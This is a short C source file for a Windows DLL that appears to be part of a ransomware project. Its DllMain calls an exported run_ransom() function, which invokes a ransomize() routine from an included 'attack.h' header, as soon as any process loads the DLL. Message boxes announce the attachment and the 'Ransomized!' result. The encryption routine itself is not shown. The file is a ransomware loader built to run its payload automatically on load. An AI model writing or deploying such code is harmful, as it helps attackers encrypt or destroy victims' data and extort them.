#include <windows.h>
#include "attack.h"

__declspec(dllexport) void run_ransom(void)
{
    ransomize();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "Ransom DLL attached to process", "Warning", MB_ICONEXCLAMATION);
        run_ransom();
        MessageBoxA(NULL, "Ransomized!", "Warning", MB_ICONEXCLAMATION);
        break;
    case DLL_PROCESS_DETACH:
        MessageBoxA(NULL, "Ransom DLL detached from process", "Warning", MB_ICONEXCLAMATION);
        break;
    }
    return TRUE;
}